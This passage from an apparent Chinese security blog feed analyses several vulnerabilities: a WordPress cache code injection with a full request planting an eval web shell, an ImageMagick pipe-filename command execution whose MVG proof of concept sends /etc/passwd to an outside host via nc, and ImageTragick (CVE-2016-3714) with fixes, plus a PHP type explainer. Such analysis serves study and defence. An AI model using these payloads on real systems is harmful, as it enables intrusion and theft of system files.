在`#2`中![9E14F734-4D79-4D7F-A356-9F4FFA32B805.png](http://Johnis.online/usr/uploads/2016/06/1158169231.png)

这个函数从`$wp_query`中取出了`cat`参数被污染的值,并且最终传入了`functions.php`中的`get_category()`拼接的语句中执行了注入的语句.

![D651BF01-6F92-4489-9443-F775DBF723C0.png](http://Johnis.online/usr/uploads/2016/06/957824432.png)
</code></pre>]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> WordPress </tag>
            
            <tag> 代码注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WordPress <= 2.0.2 - (cache) 代码注入分析]]></title>
      <url>/2017/10/10/WordPress-Vul-1/</url>
      <content type="html"><![CDATA[<h1 id="WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit"><a href="#WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit" class="headerlink" title="WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit"></a>WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit</h1><ul>
<li>影响条件:</li>
<li>程序:WordPress</li>
<li>版本:&lt;= 2.0.2</li>
<li>严重程度:高危</li>
</ul>
<h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>这个漏洞问题出在WordPress生成的序列化后的缓存文件中.因为缓存文件的后缀为<code>php</code>,文件的内容可控,并且文件名在一定条件下可预见,所以在一定条件下可以getshell</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下断点在生成问题文件的地方</p>
<p><strong>程序流程图</strong></p>
<p><img src="/old/2017/10/10/WordPress-Vul-1/383653936.png" alt="1.png"></p>
<p>出问题的是<br>wp-includes/cache.php<br>文件中的save()函数</p>
<p>save()函数序列化了用户的资料之后再保存到</p>
<a id="more"></a>
<p><code>wp-content/cache/userlogins</code>,<code>wp-content/cache/users</code>这两个目录底下,因为序列化后的文件的后缀是<code>.php</code>所以只要想办法插入我们的恶意代码并且让PHP-cgi执行就好了.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$cache_file = $group_dir . md5($id . DB_PASSWORD) . <span class="string">'.php'</span>;</div><div class="line"><span class="comment">// Remove the cache file if the key is not set.</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;cache[$group][$id])) &#123;</div><div class="line"><span class="keyword">if</span> (file_exists($cache_file))</div><div class="line">@ unlink($cache_file);</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>save()函数中生成的缓存文件名方法是<code>md5($id . DB_PASSWORD)</code>.所以我们需要知道$id与DB_PASSWORD.</p>
<p>$id的其中一个值就是管理员的帐号,一般都有一个帐号叫做<code>admin</code>.所以md5(‘admin’.’数据库密码’)就是包涵恶意代码的文件名.</p>
<p>因为写入的文件内容由<code>//</code>开头</p>
<p><img src="/old/2017/10/10/WordPress-Vul-1/1658973869.png" alt="2.png"></p>
<p>如果不输入一个换行符的话,会被始终认为其后的内容是注释,所以需要加入回车符号,经过url编码后的回车符号是<code>%0D</code>并且需要在后面再加上<code>//</code>防止后面序列化的字符被程序认为是我们想要执行的代码,所以最终的payload就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//%0D@eval($_POST[&apos;c&apos;]);%0D//</div></pre></td></tr></table></figure>
<p>这个漏洞的利用条件是:</p>
<ol>
<li>文件夹有写入权限</li>
<li>cache功能打开</li>
<li>知道用户的ID与数据库密码(可能为空)</li>
</ol>
<p>发送以下完整payload,就可以在<code>wp-content/cache/userlogins</code>或者<code>wp-content/cache/users/</code>中getshell了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from=profile&amp;checkuser_id=1&amp;user_login=admin&amp;first_name=123&amp;last_name=&amp;nickname=test&amp;display_name=//%0D @eval($_POST[&apos;c&apos;]);%0D//&amp;email=admin@example.com&amp;url=http%3A%2F%2F&amp;aim=&amp;yim=&amp;jabber=&amp;description=&amp;pass1=&amp;pass2=&amp;rich_editing=true&amp;submit=Update+Profile+%C2%BB</div></pre></td></tr></table></figure>
<p>修复方案:<br>1.将生成的文件命名为不可执行后缀例如<code>.txt</code></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> WordPress </tag>
            
            <tag> 代码注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[从PHP源代码学习PHP--PHP类型]]></title>
      <url>/2017/10/10/PHP-Type/</url>
      <content type="html"><![CDATA[<h1 id="PHP类型"><a href="#PHP类型" class="headerlink" title="PHP类型"></a>PHP类型</h1><h2 id="PHP类型基础知识"><a href="#PHP类型基础知识" class="headerlink" title="PHP类型基础知识"></a>PHP类型基础知识</h2><p>PHP是弱类型语言(依照laruence的说法是一种中强类型语言)</p>
<p>所谓的弱类型就是在申明一个变量的时候，并不需要显式指明它保存的数据的类型,在程序执行的过程中可以根据需求动态的改变变量的类型.</p>
<p>那PHP是如何实现这个功能的呢?</p>
<p>首先PHP定义了一个保存变量的结构体(C语言)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> <span class="title">zval</span>;</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;</div><div class="line"><span class="keyword">long</span> lval;                    <span class="comment">/* long value */</span></div><div class="line"><span class="keyword">double</span> dval;                <span class="comment">/* double value */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line"><span class="keyword">char</span> *val;</div><div class="line"><span class="keyword">int</span> len;</div><div class="line">&#125; str;</div><div class="line">HashTable *ht;                <span class="comment">/* hash table value */</span></div><div class="line">zend_object_value obj;</div><div class="line">zend_ast *ast;</div><div class="line">&#125; zvalue_value;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></div><div class="line"><span class="comment">/* Variable information */</span></div><div class="line">zvalue_value value;        <span class="comment">/* value */</span></div><div class="line">zend_uint refcount__gc;   <span class="comment">/* PHP的内存回收机制需要这个值,现在我们并不需要对它特别关注 */</span></div><div class="line">zend_uchar type;    <span class="comment">/* active type */</span></div><div class="line">zend_uchar is_ref__gc;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>保存变量的地方是<code>_zvalue_value</code>,<code>_zvalue_value</code>定义了一个联合体①来储存用户输入的变量</p>
<p><code>_zvalue_value</code>可以把内存中的值相对应的解释为<code>long</code>、<code>double</code>、<code>str</code>等类型,比较特殊的有三种<code>HashTable *ht（数组）</code>、<code>obj(对象)</code>和<code>*ast(资源)</code></p>
<p>这个变量是什么类型由<code>zend_uchar type;    /* active type */</code>决定,</p>
<p><code>type</code>的种类在<strong>Zend/zend.h:583-601</strong>中定义.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">/* data types */</div><div class="line">/* All data types &lt;= IS_BOOL have their constructor/destructors skipped */</div><div class="line">#define IS_NULL        0</div><div class="line">#define IS_LONG        1</div><div class="line">#define IS_DOUBLE    2</div><div class="line">#define IS_BOOL        3</div><div class="line">#define IS_ARRAY    4</div><div class="line">#define IS_OBJECT    5</div><div class="line">#define IS_STRING    6</div><div class="line">#define IS_RESOURCE    7</div><div class="line">#define IS_CONSTANT    8</div><div class="line">#define IS_CONSTANT_AST    9</div><div class="line">#define IS_CALLABLE    10</div><div class="line"></div><div class="line">#define IS_CONSTANT_TYPE_MASK        0x00f</div><div class="line">#define IS_CONSTANT_UNQUALIFIED        0x010</div><div class="line">#define IS_LEXICAL_VAR                0x020</div><div class="line">#define IS_LEXICAL_REF                0x040</div><div class="line">#define IS_CONSTANT_IN_NAMESPACE    0x100</div><div class="line"></div><div class="line">#define IS_CONSTANT_TYPE(type) (((type) &amp; IS_CONSTANT_TYPE_MASK) &gt;= IS_CONSTANT &amp;&amp; ((type) &amp; IS_CONSTANT_TYPE_MASK) &lt;= IS_CONSTANT_AST)</div></pre></td></tr></table></figure>
<p>PHP中实现转换就是当<code>zval.type = IS_LONG</code>是,就把结构体里的<code>value</code>转换成<code>long</code>型,当<code>zval.type = IS_STRING</code>时,就把结构体里面的<code>value</code>转换成<code>str</code>类型</p>
<p>明白了以上基础知识就可以来探究<code>zval.type</code>会在哪些场景带来哪些问题了.</p>
<hr>
<p>①为什么要用联合体呢?</p>
<p>在<code>K&amp;R</code>的<code>&lt;&lt;Pointer on C&gt;&gt;</code>中我们可以翻阅到这么一段文字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">联合的声明和结构类似,但它的行为方式却和结构不同.联合的所有成员引用的是内存中相同的位置.当你想在不同的时刻把不同的东西储存在同一个位置的时候,就可以使用联合.</div></pre></td></tr></table></figure>
<p>联合体可以用来动态的表示同一个内存中的值的类型.假如使用<code>结构体</code>来储存用户输入地变量的话,那么假设用户输入了<code>1</code>,如果想要把<code>1</code>以<code>char</code>,<code>int</code>,<code>double</code>等等来表示的话,就会成倍的增加内存占用.</p>
<hr>
]]></content>
      
        <categories>
            
            <category> 源码分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 源码分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ImageMagick另一个命令执行--popen_utf8()函数]]></title>
      <url>/2017/10/10/ImageMagick2/</url>
      <content type="html"><![CDATA[<h2 id="心情杂谈"><a href="#心情杂谈" class="headerlink" title="心情杂谈"></a>心情杂谈</h2><p>哎哎哎,老司机一言不合就爆洞啊,这个洞在之前分析CVE-2016-3714的时候也发现了,结果被捂烂了…心塞塞~那我就写一下当时是怎么发现怎么这个洞…</p>
<h2 id="漏洞分析正文"><a href="#漏洞分析正文" class="headerlink" title="漏洞分析正文"></a>漏洞分析正文</h2><p>之前在分析CVE-2016-3714的时候想,<code>system()</code>函数处理有问题,那么其他类似的有哪些函数呢?</p>
<p>下面是一个可以执行命令的函数列表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">system()</div><div class="line"></div><div class="line">popen()</div><div class="line"></div><div class="line">fork()+exec()</div><div class="line"></div><div class="line">execl()</div></pre></td></tr></table></figure>
<p>那么搜索一下调用<code>system()</code>函数有哪些地方?经过搜索的话,最终只有CVE-2016-3714这个漏洞点调用到了一个<code>system()</code>. 那这么接下来搜索一下<code>popen()</code>函数调用点</p>
<a id="more"></a>
<p>文件:magick/blob.c:2503行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div><div class="line">image-&gt;blob-&gt;type=PipeStream;</div><div class="line">image-&gt;blob-&gt;exempt=MagickTrue;</div><div class="line">return(SetStreamBuffering(image_info,image));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们可以看到有一个<code>popen_utf8()</code>函数.</p>
<p>跟进函数文件:magick/utility-private.h:173行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static inline FILE *popen_utf8(const char *command,const char *type)</div><div class="line">&#123;</div><div class="line">#if !defined(MAGICKCORE_WINDOWS_SUPPORT) || defined(__CYGWIN__) || defined(__MINGW32__) || defined(__MINGW64__)</div><div class="line">return(popen(command,type));</div><div class="line">#else</div><div class="line">FILE</div><div class="line">*file;</div><div class="line"></div><div class="line">wchar_t</div><div class="line">*type_wide,</div><div class="line">*command_wide;</div><div class="line"></div><div class="line">command_wide=create_wchar_path(command);</div><div class="line">if (command_wide == (wchar_t *) NULL)</div><div class="line">return((FILE *) NULL);</div><div class="line">type_wide=create_wchar_path(type);</div><div class="line">if (type_wide == (wchar_t *) NULL)</div><div class="line">&#123;</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return((FILE *) NULL);</div><div class="line">&#125;</div><div class="line">file=_wpopen(command_wide,type_wide);</div><div class="line">type_wide=(wchar_t *) RelinquishMagickMemory(type_wide);</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return(file);</div><div class="line">#endif</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看见<code>popen_utf8()</code>直接return了<code>popen()</code>函数的值回来.</p>
<p>那么问题来了,谁调用了<code>popen_utf8</code>呢？</p>
<p>向上追溯代码可以看到是<code>OpenBlob()</code>函数调用了<code>popen_utf8</code>.继续查看谁调用了<code>OpenBlob()</code></p>
<p><img src="/old/2017/10/10/ImageMagick2/1879977320.png" alt="8248DCA8-27B0-46A0-A5EE-25C3EA3BB8FF.png"></p>
<p>我们可以看到一堆地方调用到了<code>OpenBlob()</code>,看到一个眼熟的地方!</p>
<p>使用GDB反调会让眼熟的地方明显一点</p>
<p><img src="/old/2017/10/10/ImageMagick2/1560639559.png" alt="5B98ABC0-8703-43CC-A6C4-53B19D9BBD8F.png"><br>可以看到流程中有<code>constitute.c</code>调用到<code>OpenBlob()</code>.而之前分析的时候也经常看<code>constitute.c</code>,很明显会选择先看这个地方的调用有没有问题.</p>
<p>在<code>constitute.c:448行</code></p>
<p>可以看到<code>status＝OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
<p>status在imagemagick里面一般都是用MagickTrue或者MagickFalse作为最终的函数返回值的,知道这点就好了.</p>
<p><code>OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
<p>在这个函数中<code>image_info,image</code>两个参数的值都是由我们传进去的.</p>
<p>OpenBlob函数先进行了<code>Policy</code>的检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">if (*type == &apos;w&apos;)</div><div class="line">rights=WritePolicyRights;</div><div class="line">if (IsRightsAuthorized(PathPolicyDomain,rights,filename) == MagickFalse)</div><div class="line">&#123;</div><div class="line">errno=EPERM;</div><div class="line">(void) ThrowMagickException(exception,GetMagickModule(),PolicyError,</div><div class="line">&quot;NotAuthorized&quot;,&quot;`%s&apos;&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最重要的一段在如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">if (*filename == &apos;|&apos;)</div><div class="line">&#123;</div><div class="line">char</div><div class="line">mode[MaxTextExtent];</div><div class="line"></div><div class="line">/*</div><div class="line">Pipe image to or from a system command.</div><div class="line">*/</div><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为<code>*filename</code>指向指针的第一个字符,如果第一个字符是<code>|</code>那么就调用<code>popen_utf8()</code>去打开文件.</p>
<p>所以我们要控制的就是<code>|</code>后面的字符.如果我们想要控制这里的<code>filename</code>就意味着我们需要传入的文件的名称<code>|</code>+<code>你要执行的命令</code></p>
<p>经过测试这个是可以的,这个地方可以命令执行,但是万一要是上传的文件名字有限制<code>|</code>这个符号不让作为文件名的名字的话,那就挺别扭的.而且<code>windows</code>底下应该是不能用<code>|</code>作为文件的名字的,所以还是把payload写在文件里面比较好.</p>
<p>通过对imagemagick源码的浏览,并且查询imagemagick的官方文档.</p>
<p><a href="http://www.imagemagick.org/script/magick-vector-graphics.php" target="_blank" rel="external">官方文档</a></p>
<p>可以发现mvg有很多需要操作文件mvg内文件的原语,这些地方都是会调用到<code>OpenBlob()</code></p>
<p>例如以下操作:</p>
<p><img src="/old/2017/10/10/ImageMagick2/1398429269.png" alt="D51CD2F4-9C55-48D5-B28D-5B1551B4C4E8.png"></p>
<p><img src="/old/2017/10/10/ImageMagick2/1259270032.png" alt="29336A5F-27D6-442F-86CF-C49C720A1AF9.png"></p>
<p><img src="/old/2017/10/10/ImageMagick2/1921966953.png" alt="C973A35E-D2D6-43AA-A6DF-D43D0F8FEB3B.png"></p>
<p><img src="/old/2017/10/10/ImageMagick2/3752992863.png" alt="F4958AC8-5D13-49B2-99E8-61175C9BFDCE.png"></p>
<p>Poc使用<code>image over</code>这个原语.</p>
<p>那么Poc就出来了</p>
<p><code>1.mvg</code>文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image Over 0,0 0,0 &apos;|cat /etc/passwd|nc Johnis.online 9999&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
<p>然后attack的服务器运行<code>nc -l 0.0.0.0 9999 &gt; passwd</code></p>
<p>这个漏洞有兴趣的同学可以去再找一下其它玩法…</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Imagetragick </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Imagetragick(CVE-2016-3714)执行过程,漏洞分析以及修复方案]]></title>
      <url>/2017/10/10/Imagetragick/</url>
      <content type="html"><![CDATA[<p>##什么是ImageMagick</p>
<p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p>
<p>##漏洞分析正文</p>
<p>这次披露的是ImageMagick的一个命令执行漏洞。首先定位到最终漏洞代码执行的地方,老外给出的poc是在一个文件内填充以下字符命名为<code>.mvg</code>格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://example.com/image.jpg&quot;ls &quot;-la)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>我以POC为一个切入点,分析POC的执行过程。</p>
<p><img src="/old/2017/10/10/Imagetragick/351343864.png" alt="imagetragic_2.png"><br>首先从入口函数CovertMain()开始,在第81行MagickCommandGenesis()的第二个参数传入了ConvertImageCommand这个变量,这个变量是一个函数指针,指向了ConvertImageCommand()的函数首地址。所以MagickCommandGenesis()实现了函数的动态调用(非常好的写法)。</p>
<p>文件:wand/delegate.c:417行</p>
<p><img src="/old/2017/10/10/Imagetragick/3197429134.png" alt="imagetragic_3.png"><br>的函数ExternalDelegateCommand()中调用了system()函数，执行了我们注入的命令。</p>
<p>整个执行流程是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ConvertMain() -&gt; MagickCommandGenesis() -&gt; ConvertImageCommand() -&gt; ReadImages() -&gt; ReadImage() -&gt; ReadMVGImage() -&gt; DrawImage() -&gt;ReadImage() -&gt; InvokeDelegate() -&gt; system()</div></pre></td></tr></table></figure>
<p>ConvertImageCommand() -&gt; ReadImages() -&gt; ReadImage()这一段主要做了读取判断文件名类型,根据文件类型调用相应的decoder,而调用decoder的方式使用的是delegate模式。</p>
<p>在coders/mvg.c:67行中</p>
<p>有一个IsMVG()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (LocaleNCompare((const char *) magick,&quot;push graphic-context&quot;,20) == 0)</div><div class="line">return(MagickTrue);</div></pre></td></tr></table></figure>
<p>这一段读取了文件前20个字符，判断是否是一个MVG格式的图片,</p>
<p><code>viewbox 0 0 640 480</code>主要由<code>文件:coders/mvg.c:170-204</code>处理。</p>
<p>处理<code>fill</code>字段就是出问题的地方, 当mvg文件有<code>fill</code>字段代表需要填充外部的图片进当前的图片,<code>pattern_info-&gt;filename</code>就是从`fill｀中解析出来的填充文件的字符串</p>
<p><img src="/old/2017/10/10/Imagetragick/1794061138.png" alt="imagetragic_4.png"><br><code>magick/delegate.c</code></p>
<p>中的InvokeDelegate()进行了调用了ExternalDelegateCommand()执行外部命令。</p>
<p>［题外话：可以看出来这个功能使用了delegate代理模式(对方法的封装)］</p>
<p>在调用前实际上是对当前种类的请求方法,相应的权限进行了判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if (IsRightsAuthorized(domain,rights,read_info-&gt;magick) == MagickFalse)</div><div class="line">&#123;</div><div class="line">errno=EPERM;</div><div class="line">(void) ThrowMagickException(exception,GetMagickModule(),PolicyError,</div><div class="line">&quot;NotAuthorized&quot;,&quot;`%s&apos;&quot;,read_info-&gt;filename);</div><div class="line">read_info=DestroyImageInfo(read_info);</div><div class="line">return((Image *) NULL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并不是像网上说的这个程序一点安全都没有做</p>
<p>并且在<code>delegate.c</code>中也有对权限的检测。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if (IsRightsAuthorized(DelegatePolicyDomain,rights,encode) == MagickFalse)</div><div class="line">&#123;</div><div class="line">errno=EPERM;</div><div class="line">(void) ThrowMagickException(exception,GetMagickModule(),PolicyError,</div><div class="line">&quot;NotAuthorized&quot;,&quot;`%s&apos;&quot;,encode);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且在<code>delegate.c</code>中定义了合法字符的白名单,问题有一部分出在白名单这。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">static char</div><div class="line">whitelist[] =</div><div class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- &quot;</div><div class="line">&quot;.@&amp;;&lt;&gt;()|/\\\&apos;\&quot;:%=~`&quot;;</div><div class="line">...</div><div class="line">for (p+=strspn(p,whitelist); p != q; p+=strspn(p,whitelist))</div><div class="line">*p=&apos;_&apos;;</div><div class="line">return(sanitize_command);</div></pre></td></tr></table></figure>
<p>我们可以看到不在白名单中的字符全部会被替换成_,但是官方却把<code>|</code>和<code>;</code>放在了白名单中,导致了可以执行多个命令…….</p>
<p>所以,经过以上的流程分析,可以有两种修复方法：</p>
<p>1.设置<code>Policy</code>文件</p>
<p>policy.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;policymap&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;TEXT&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;SHOW&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;WIN&quot; /&gt;</div><div class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PLT&quot; /&gt;</div><div class="line">&lt;/policymap&gt;</div></pre></td></tr></table></figure>
<p><a href="https://imagetragick.com/" target="_blank" rel="external">来自imagetragick.com</a></p>
<p>2.如果不需要一些不常用的delegate里面的功能只保留https这个功能的话,去掉whitelist[] 里面的管道符号<code>|</code>，还有<code>;</code>号等特殊符号</p>
<p>可以看到去掉白名单里面的<code>;</code>和<code>|</code>之后,命令执行已经不成功了:/</p>
<p>相应的,想要发掘对应的delegate可以有什么样的利用,可以去执行具以下具体的委托</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">&lt;delegatemap&gt;</div><div class="line">&lt;delegate decode=&quot;autotrace&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;convert&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;pnm:%u&amp;quot;\n&amp;quot;autotrace&amp;quot; 